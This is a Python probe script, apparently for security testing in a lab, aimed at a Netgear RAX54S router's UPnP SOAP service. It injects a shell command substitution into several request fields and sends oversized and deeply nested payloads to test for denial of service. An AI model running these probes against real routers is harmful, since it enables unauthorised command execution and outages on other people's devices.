#!/usr/bin/env python3
"""Bounded unauthenticated RCE/DoS probes for the isolated RAX54S UPnP lab."""

from __future__ import annotations

import http.client
import socket
import time


HOST = "192.168.1.1"
PORT = 56688
PATH = "/Public_UPNP_C3"
URN = "urn:NETGEAR-ROUTER:service"
MARKER = "FRIDAY_RAX54S_RCE_MARKER"


def request(action: str, body: str, timeout: float = 4) -> tuple[str, int]:
    envelope = (
        '<?xml version="1.0"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
        f"<s:Body>{body}</s:Body></s:Envelope>"
    ).encode()
    connection = http.client.HTTPConnection(HOST, PORT, timeout=timeout)
    try:
        connection.request(
            "POST",
            PATH,
            body=envelope,
            headers={
                "Content-Type": 'text/xml; charset="utf-8"',
                "SOAPAction": f'"{action}"',
            },
        )
        response = connection.getresponse()
        payload = response.read()
        return f"HTTP/{response.version / 10:.1f} {response.status} {response.reason}", len(payload)
    except (ConnectionError, TimeoutError, OSError, socket.timeout) as error:
        return f"no-response ({error})", 0
    finally:
        connection.close()


def baseline() -> bool:
    namespace = "urn:schemas-upnp-org:service:WANIPConnection:1"
    status, _ = request(
        f"{namespace}#GetExternalIPAddress",
        f'<m:GetExternalIPAddress xmlns:m="{namespace}"/>',
    )
    return status.startswith("HTTP/1.1 200")


def main() -> int:
    command = f"$(touch /tmp/{MARKER})"
    cases = (
        (
            "soapaction-command",
            f"{URN}:DeviceInfo:1#GetInfo;{command}",
            f'<m:GetInfo xmlns:m="{URN}:DeviceInfo:1"/>',
        ),
        (
            "ntp-command",
            f"{URN}:DeviceConfig:1#SetNTP",
            f'<m:SetNTP xmlns:m="{URN}:DeviceConfig:1">'
            f"<NewNTPServer1>{command}</NewNTPServer1></m:SetNTP>",
        ),
        (
            "firmware-url-command",
            f"{URN}:DeviceConfig:1#CheckAndDownloadNewFirmware",
            f'<m:CheckAndDownloadNewFirmware xmlns:m="{URN}:DeviceConfig:1">'
            f"<NewFirmwareURL>{command}</NewFirmwareURL>"
            "</m:CheckAndDownloadNewFirmware>",
        ),
        (
            "ookla-command",
            f"{URN}:AdvancedQoS:1#SetOOKLASpeedTestStart",
            f'<m:SetOOKLASpeedTestStart xmlns:m="{URN}:AdvancedQoS:1">'
            f"<NewServerID>{command}</NewServerID></m:SetOOKLASpeedTestStart>",
        ),
        (
            "long-action",
            f"{URN}:DeviceInfo:1#" + ("A" * 16384),
            f'<m:GetInfo xmlns:m="{URN}:DeviceInfo:1"/>',
        ),
        (
            "deep-xml",
            f"{URN}:DeviceInfo:1#GetInfo",
            "<x>" * 512 + "x" + "</x>" * 512,
        ),
        (
            "large-value",
            f"{URN}:DeviceConfig:1#SetNTP",
            f'<m:SetNTP xmlns:m="{URN}:DeviceConfig:1"><NewNTPServer1>'
            + ("A" * 262144)
            + "</NewNTPServer1></m:SetNTP>",
        ),
    )

    print(f"baseline_before={'pass' if baseline() else 'fail'}")
    for name, action, body in cases:
        status, size = request(action, body)
        time.sleep(0.2)
        alive = baseline()
        print(f"{name}: status={status!r} bytes={size} service_alive={str(alive).lower()}")
        if not alive:
            return 2
    print("baseline_after=pass")
    print(f"marker=/tmp/{MARKER}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
